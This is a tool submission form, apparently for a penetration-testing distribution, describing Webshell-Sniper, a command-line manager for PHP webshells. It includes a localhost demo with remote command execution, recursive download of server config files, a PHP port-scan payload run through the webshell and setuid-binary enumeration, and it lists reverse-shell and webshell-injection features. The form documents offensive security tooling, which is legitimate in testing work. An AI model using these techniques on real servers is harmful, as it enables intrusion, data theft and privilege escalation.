- [Name] - The name of the tool
	Webshell-Sniper

- [Version] - What version of the tool should be added?
--- If it uses source control (such as git), please make sure there is a release to match (e.g. git tag)
	Lasted Version: v0.1.0
	The tools uses Git and GitHub to control its versions.
	The repo address is : https://github.com/wangyihang/webshell-sniper.git

- [Homepage] - Where can the tool be found online? Where to go to get more information?
	HomePage: https://github.com/wangyihang/webshell-sniper
	ReadMe: https://github.com/WangYihang/Webshell-Sniper/blob/master/README.md

- [Download] - Where to go to get the tool?
	https://github.com/WangYihang/Webshell-Sniper/releases

- [Author] - Who made the tool?
	WangYihang <wangyihanger@gmail.com>
	https://github.com/wangyihang

- [Licence] - How is the software distributed? What conditions does it come with?
	GNU General Public License v3.0

- [Description] - What is the tool about? What does it do?
	This tool helps users easily manage the server with a web-shell
	and can customize their own scripts and write the functions they want to achieve. 
	The existing functions include but are not limited to: 
	file management, database management, suid search, Find database configuration files, download files and more
	You can develope your own functions by using the API, which is located at: 
	https://github.com/WangYihang/Webshell-Sniper/blob/master/core/webshell/WebShell.py
	also you can write some script for your own encrypt method to prevent your data from being catpured and so on
	it is all denpends on you, :D

- [Dependencies] - What is needed for the tool to work?
	Python 2.7
	Python Libraries (All dependencies are listed in the requirements.txt): 
		requests
		readline
		urllib
		json

- [Similar tools] - What other tools are out there?
	WeBaCoo
	Weevely
	AntSword (Not included in Kali destribution)

- [How to install] - How do you compile it? 
	The tool is written by Python, and Python is an Interpreted Language.
	So to install it, all steps you need are: 
		1. clone the repo by command: git clone https://github.com/wangyihang/webshell-sniper
		2. install the dependencies: pip install -r requirements.txt
		3. start to use: python webshell-sniper.py

- [How to use] - What are some basic commands/functions to demonstrate it?
	There is a lot of useful commands, for instance:
	1. connect to the target server: 
		➜  Webshell-Sniper git:(master) python webshell-sniper.py http://127.0.0.1/c.php POST c
		===================================================
				   ____        _
				  / ___| _ __ (_)_ __   ___ _ __
				  \___ \| '_ \| | '_ \ / _ \ '__|
				   ___) | | | | | |_) |  __/ |
				  |____/|_| |_|_| .__/ \___|_|
							  |_|
		===================================================
		|     WebShell Manager Via Terminal (v1.1.0)      |
		|  https://github.com/wangyihang/webshell-sniper  |
		===================================================
		[+] Checking the connection to the webshell...
		[+] The status code is 200
		[+] Checking whether the webshell is still work...
		[+] Using challenge flag : [pXdYSuGHMskRlRpTPQLiJNmOeZnhvWxP]
		[+] Using token : [DGwMPUCrrpNaxBPtSscUKtixbigiuxBe]
		[+] It works well!
		[+] ================================
		[+] URL : http://127.0.0.1/c.php
		[+] Method : POST
		[+] Password : c
		[+] Document Root : /var/www/html
		[+] ================================
		[+] PHP version : 
			PHP 7.1.12-3+ubuntu16.04.1+deb.sury.org+1 (cli) (built: Dec 14 2017 15:37:13) ( NTS )
		Copyright (c) 1997-2017 The PHP Group
		Zend Engine v3.1.0, Copyright (c) 1998-2017 Zend Technologies
			with Zend OPcache v7.1.12-3+ubuntu16.04.1+deb.sury.org+1, Copyright (c) 1999-2017, by Zend Technologies
		[+] Kernel version : 
			Linux VM-129-148-ubuntu 4.4.0-109-generic #132-Ubuntu SMP Tue Jan 9 19:52:07 UTC 2018 i686 i686 i686 GNU/Linux
		[+] ================================
		[+] WebRoot : /var/www/html
		[+] ================================
		[+] This webshell works well, adding into online list...
		Commands : 
				0. [h|help|?|\n] : show this help
				1. [sh|shell] : start an interactive shell
				2. [rsh|rshell] : start an reverse shell
				3. [db|database] : database manager
				4. [c|config] : find the config files
				5. [r|read] : read file
				6. [kv|kernel_version] : kernel version
				7. [pv|php_version] : php version
				8. [p|print] : print target server info
				9. [fwd] : find writable directory
				10. [fwpf] : find writable php file
				11. [gdf] : get disabled function
				12. [ps] : port scan
				14. [fsb] : find setuid binaries
				15. [dl] : download files
				16. [dla] : download files advanced
				17. [setl] : set default execute command on localhost
				18. [setr] : set default execute command on remote server
				19. [aiw] : auto inject webshell
				20. [aimw] : auto inject memery webshell
				21. [fr] : flag reaper
				22. [q|quit|exit] : quit
		[sniper]=>

	2. get a shell of the target server:
		[sniper]=>setr
		[sniper]=>id
		[-] Unsupported function!
		[+] Executing command on target server...
		[+] {'url': 'http://127.0.0.1/c.php', 'password': 'c', 'method': 'POST'}
		[+] Result : 
		uid=33(www-data) gid=33(www-data) groups=33(www-data)
		[sniper]=>whoami
		[-] Unsupported function!
		[+] Executing command on target server...
		[+] {'url': 'http://127.0.0.1/c.php', 'password': 'c', 'method': 'POST'}
		[+] Result : 
		www-data
		[sniper]=>
	3. Download files:
		[sniper]=>dl
		Input path (/var/www/html) : /etc/apache2
		[+] {'url': 'http://127.0.0.1/c.php', 'password': 'c', 'method': 'POST'}
		[+] Checking file exists : [/etc/apache2]
		[-] Checking finished successfully!
		[+] File (/etc/apache2) is existed!
		[+] Checking file exists : [/etc/apache2]
		[-] Checking finished successfully!
		[+] File (/etc/apache2) is existed!
		[+] The target file is a directory, using recursion download...
		Input --name '*.php' : *
		[+] Directories : 
			[/etc/apache2]
			[/etc/apache2/conf-enabled]
			[/etc/apache2/sites-available]
			[/etc/apache2/conf-available]
			[/etc/apache2/sites-enabled]
			[/etc/apache2/mods-available]
			[/etc/apache2/mods-enabled]

		[+] Create directories locally...
		[+] Creating : [127.0.0.1/etc/apache2]
		[+] Creating : [127.0.0.1/etc/apache2/conf-enabled]
		[+] Creating : [127.0.0.1/etc/apache2/sites-available]
		[+] Creating : [127.0.0.1/etc/apache2/conf-available]
		[+] Creating : [127.0.0.1/etc/apache2/sites-enabled]
		[+] Creating : [127.0.0.1/etc/apache2/mods-available]
		[+] Creating : [127.0.0.1/etc/apache2/mods-enabled]
		[+] Listing all files...
		[+] Listing files success!
		[+] Downloading /etc/apache2/sites-available/default-ssl.conf to 127.0.0.1/etc/apache2/sites-available/default-ssl.conf
		[+] Ready to downloading file : /etc/apache2/sites-available/default-ssl.conf
		[+] Detacting local file exists...
		[-] Local file not exists...
		[+] Fetch data success! Start saving...
		[+] Saving...
		[+] Download finished!
		[+] Downloading /etc/apache2/sites-available/000-default.conf to 127.0.0.1/etc/apache2/sites-available/000-default.conf
		[+] Ready to downloading file : /etc/apache2/sites-available/000-default.conf
		[+] Detacting local file exists...
		[-] Local file not exists...
		[+] Fetch data success! Start saving...
		[+] Saving...
		[+] Download finished!
		[+] Downloading /etc/apache2/conf-available/localized-error-pages.conf to 127.0.0.1/etc/apache2/conf-available/localized-error-pages.conf
		[+] Ready to downloading file : /etc/apache2/conf-available/localized-error-pages.conf
		[+] Detacting local file exists...
		[-] Local file not exists...
		[+] Fetch data success! Start saving...
		[+] Saving...
		[+] Download finished!


	4. Port Scan:
		[sniper]=>ps
		Input hosts (192.168.1.1/24) : 127.0.0.1/32
		Input ports (21,22,25,80,443,445,3389)
		[+] {'url': 'http://127.0.0.1/c.php', 'password': 'c', 'method': 'POST'}
		[+] Starting port scan... 127.0.0.1/32 => [21,22,25,80,443,445,3389]
		[+] Executing : 
		set_time_limit(0);error_reporting(0);$ports_input='21,22,25,80,443,445,3389';$hosts_input='127.0.0.1/32';$timeout=0.5;$ports=explode(',', $ports_input);$hosts_array=explode('/', $hosts_input);$ip=ip2long($hosts_array[0]);$net_mask=intval($hosts_array[1]);$range=pow(2, (32 - $net_mask));$start=$ip >> (32 - $net_mask) << (32 - $net_mask);for ($i=0;$i < $range;$i++) {$h=long2ip($start + $i);foreach ($ports as $p) {$c=@fsockopen($h, intval($p), $en, $es, $timeout);if (is_resource($c)) {echo $h.':'.$p.' => open
		';fclose($c);} else {echo $h.':'.$p.' => '.$es.'
		';}ob_flush();flush();}}
		[+] Result : 
		127.0.0.1:21 => Connection refused
		127.0.0.1:22 => open
		127.0.0.1:25 => Connection refused
		127.0.0.1:80 => open
		127.0.0.1:443 => Connection refused
		127.0.0.1:445 => Connection refused
		127.0.0.1:3389 => Connection refused
	
	5. Find suid binaries:
		[sniper]=>fsb
		[+] {'url': 'http://127.0.0.1/c.php', 'password': 'c', 'method': 'POST'}
		[+] Executing : find /usr/local/sbin -user root -perm -4000 -exec ls -ldb {} \;
		[!] Nothing found!
		[+] Executing : find /usr/local/bin -user root -perm -4000 -exec ls -ldb {} \;
		[!] Nothing found!
		[+] Executing : find /usr/sbin -user root -perm -4000 -exec ls -ldb {} \;
		[!] Nothing found!
		[+] Executing : find /usr/bin -user root -perm -4000 -exec ls -ldb {} \;
		[+] Found : 
		-rwsr-xr-x 1 root root 48264 May 17  2017 /usr/bin/chfn
		-rwsr-xr-x 1 root root 18216 Jan 18  2016 /usr/bin/pkexec
		-rwsr-xr-x 1 root root 159852 Jul  4  2017 /usr/bin/sudo
		-rwsr-xr-x 1 root root 34680 May 17  2017 /usr/bin/newgrp
		-rwsr-xr-x 1 root root 39560 May 17  2017 /usr/bin/chsh
		-rwsr-xr-x 1 root root 53128 May 17  2017 /usr/bin/passwd
		-rwsr-xr-x 1 root root 36288 May 17  2017 /usr/bin/newgidmap
		-rwsr-xr-x 1 root root 78012 May 17  2017 /usr/bin/gpasswd
		-rwsr-xr-x 1 root root 36288 May 17  2017 /usr/bin/newuidmap

		[+] Executing : find /sbin -user root -perm -4000 -exec ls -ldb {} \;
		[!] Nothing found!
		[+] Executing : find /bin -user root -perm -4000 -exec ls -ldb {} \;
		[+] Found : 
		-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
		-rwsr-xr-x 1 root root 38900 May 17  2017 /bin/su
		-rwsr-xr-x 1 root root 157424 Jan 29  2017 /bin/ntfs-3g
		-rwsr-xr-x 1 root root 34812 Jun 15  2017 /bin/mount
		-rwsr-xr-x 1 root root 26492 Jun 15  2017 /bin/umount
		-rwsr-xr-x 1 root root 38932 May  8  2014 /bin/ping
		-rwsr-xr-x 1 root root 43316 May  8  2014 /bin/ping6

		[+] Executing : find /usr/games -user root -perm -4000 -exec ls -ldb {} \;
		[!] Nothing found!
		[+] Executing : find /usr/local/games -user root -perm -4000 -exec ls -ldb {} \;
		[!] Nothing found!
		[+] Executing : find /snap/bin -user root -perm -4000 -exec ls -ldb {} \;
		[+] Found : 
		find: '/snap/bin': No such file or directory

	6. Many useful functions are waiting for you to discovered. :D
